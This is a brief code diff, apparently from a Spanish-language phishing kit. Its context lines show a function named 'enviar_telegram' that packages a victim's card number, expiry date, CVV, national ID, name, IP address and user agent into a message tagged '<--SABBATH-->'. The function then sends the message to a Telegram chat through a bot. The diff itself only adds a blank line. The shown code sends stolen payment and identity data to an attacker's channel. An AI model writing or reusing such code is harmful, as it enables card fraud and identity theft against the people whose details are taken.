@@ -37,3 +37,4 @@ def enviar_telegram(numcc, exp, cvv, dni, name, info_date, ip, user_agent):
         f"<--SABBATH-->"
     )
     bot.send_message(CHAT_ID, mensaje)
+
